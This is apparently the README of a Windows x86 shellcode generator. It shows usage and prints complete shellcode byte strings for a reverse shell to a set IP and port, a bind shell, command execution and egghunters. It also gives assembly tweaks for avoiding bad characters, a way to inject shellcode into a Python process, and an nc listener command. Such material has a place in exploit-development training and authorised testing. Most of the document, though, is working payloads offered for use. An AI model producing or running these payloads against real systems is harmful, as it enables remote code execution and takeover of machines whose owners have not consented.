# Windows x86 Shellcode Generator

## Usage

```
$ python3 win_x86_shellcoder.py -h
usage: win_x86_shellcoder.py [-h] [-b BADCHARS] [--run_shellcode] [--use_windbg] [-e {process,thread,none}]
                             {reverse,bind,exec,egghunter} ...

Windows x86 Shellcode Generator

positional arguments:
  {reverse,bind,exec,egghunter}
                        Shellcode mode
    reverse             Reverse shell
    bind                Bind shell
    exec                Execute command
    egghunter           Egghunter

options:
  -h, --help            show this help message and exit
  -b BADCHARS, --badchars BADCHARS
                        Bad chars
  --run_shellcode       Run shellcode
  --use_windbg          Set int3 for windbg
  -e {process,thread,none}, --exit_func {process,thread,none}
                        Exit Function
```


## Examples

### Reverse Shell

```
$ python3 win_x86_shellcoder.py reverse -i 192.168.1.120 -p 443
# shellcode size: 0x152 (338)
shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebz\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1c\x8b^\x08\x8b~ \x0f\xb6F\x1e\x89E\xf8V\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18\x8bG \x01\xd8\x89E\xfc\xe3?I\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x07\xc1\xca\x02\x01\xc2\xeb\xf4;T$(u\xdd\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89D$ ^aYZQ\xff\xe0^\x8b6\xeb\x98\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_Thhz\xc4v\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\x96 \x9e\xcc\xffU\x041\xc0PPP\xb0\x06P,\x05P@Phf ^\x81\xffU\x04\x89\xc61\xc0PPh\xc0\xa8\x01xf\xb8\x01\xbb\xc1\xe0\x10f\x83\xc0\x02PT_1\xc0PPPP\x04\x10PWVh\x95 ^W\xffU\x04VVV1\xc0\x8dH\rP\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\xc7(\xaa\x0b\xffU\x041\xc9Qj\xffh\xd2U\xa9.\xffU\x04'
```

### Bind Shell

```
$ python3 win_x86_shellcoder.py bind -p 54321
# shellcode size: 0x163 (355)
shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebz\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1c\x8b^\x08\x8b~ \x0f\xb6F\x1e\x89E\xf8V\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18\x8bG \x01\xd8\x89E\xfc\xe3?I\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x07\xc1\xca\x05\x01\xc2\xeb\xf4;T$(u\xdd\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89D$ ^aYZQ\xff\xe0^\x8b6\xeb\x98\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_Th\x92\xacm\xcc\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\xc8\xcb\xa7;\xffU\x041\xc0PPP\xb0\x06P,\x05P@Ph\x19\xe9\xd9/\xffU\x04\x89\xc61\xc0PPPf\xb8\xd41\xc1\xe0\x10\x04\x02PT_1\xc0\x04\x10PWVhg`\x05\x8b\xffU\x041\xc0PVh\xc9\xc6\xecE\xffU\x041\xc0PPVhOa\x0c\x9a\xffU\x04\x89\xc6VVV1\xc0\x8dH\rP\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\xd9zI\x06\xffU\x041\xc9Qj\xffh\xce\x83\xcbg\xffU\x04'
```


### Execute Command

```
$ python3 win_x86_shellcoder.py exec -c 'calc'
# shellcode size: 0xb5 (181)
shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebz\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1c\x8b^\x08\x8b~ \x0f\xb6F\x1e\x89E\xf8V\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18\x8bG \x01\xd8\x89E\xfc\xe3?I\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x07\xc1\xca\x03\x01\xc2\xeb\xf4;T$(u\xdd\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89D$ ^aYZQ\xff\xe0^\x8b6\xeb\x98\xb8\x01\x02\x02\x025\x01\x03\x03\x03Phcalc\x89\xe11\xd2RQhq\x90H\xaa\xffU\x041\xc9Qj\xffh\x97\xaae}\xffU\x04'
```


### Egghunter

#### Use ntaccess

```
$ python3 win_x86_shellcoder.py egghunter ntaccess -t w00tw00t
# shellcode size: 0x24 (36)
shellcode = b'f\x81\xca\xff\x0fBR\xb8:\xfe\xff\xff\xf7\xd8\xcd.<\x05Zt\xeb\xb8w00t\x89\xd7\xafu\xe6\xafu\xe3\xff\xe7'
```


#### Use SEH

```
$ python3 win_x86_shellcoder.py egghunter seh -t w00tw00t
# shellcode size: 0x45 (69)
shellcode = b'\xeb*Y\xb8w00tQj\xff1\xdbd\x89#\x83\xe9\x04\x83\xc3\x04d\x89\x0bj\x02Y\x89\xdf\xf3\xafu\x07\xff\xe7f\x81\xcb\xff\x0fC\xeb\xed\xe8\xd1\xff\xff\xffj\x0cY\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06X\x83\xc4\x10P1\xc0\xc3'
```


## Find Bad Chars

`-b` is an option to indicate which instruction contained the specified bad chars as `[x]`.

```
$ python3 win_x86_shellcoder.py -b '\x00\x0a\x0d\x20\x30' reverse -i 192.168.1.120 -p 443
# shellcode size: 0x152 (338)
...
[ ] 60           : pushal
[ ] 31c9         : xor ecx, ecx
[x] 648b7130     : mov esi, dword ptr fs:[ecx + 0x30]
[ ] 8b760c       : mov esi, dword ptr [esi + 0xc]
[ ] 8b761c       : mov esi, dword ptr [esi + 0x1c]
[ ] 8b5e08       : mov ebx, dword ptr [esi + 8]
[x] 8b7e20       : mov edi, dword ptr [esi + 0x20]
[ ] 0fb6461e     : movzx eax, byte ptr [esi + 0x1e]
[ ] 8945f8       : mov dword ptr [ebp - 8], eax
[ ] 56           : push esi
...
```

This script does not automatically remove all bad chars, but you can manually remove bad chars by replacing the detected instruction with another instruction.

For example, 0x20 and 0x30 can be removed by replacing the instructions in [find_and_call.py](coder/find_and_call.py) as follows.

```asm
find_and_call:
    pushad                          // Save all registers
    xor   ecx, ecx                  // ECX = 0
    inc   ecx                       // * FOR BAD CHAR 0x30 *
    mov   esi,fs:[ecx+0x2F]         // ESI = &(PEB) ([FS:0x30])
    dec   ecx                       // * FOR BAD CHAR 0x30 *
    mov   esi,[esi+0x0C]            // ESI = PEB->Ldr
    mov   esi,[esi+0x1C]            // ESI = PEB->Ldr.InInitOrder

next_module:
    mov   ebx, [esi+0x08]           // EBX = InInitOrder[X].base_address
    inc   esi                       // * FOR BAD CHAR 0x20 *
    mov   edi, [esi+0x1F]           // EDI = InInitOrder[X].module_name
    dec   esi                       // * FOR BAD CHAR 0x20 *
    movzx eax, byte ptr [esi+0x1e]  // EAX = InInitOrder[X].module_name_length
    mov   [ebp-0x8], eax            // Save ModuleNameLength for later
    push  esi                       // Save InInitOrder for next module
```


## Debug Shellcode (for Windows Only)

### Inject shellcode into a Python process

`--run_shellcode`

```
python3 win_x86_shellcoder.py --run_shellcode reverse -i 192.168.1.120 -p 443
```

On 192.168.1.120

```
nc -nlvp 443
```


### Insert int3 for debugger into shellcode

`--use_windbg`

```
python3 win_x86_shellcoder.py --run_shellcode --use_windbg reverse -i 192.168.1.120 -p 443
```

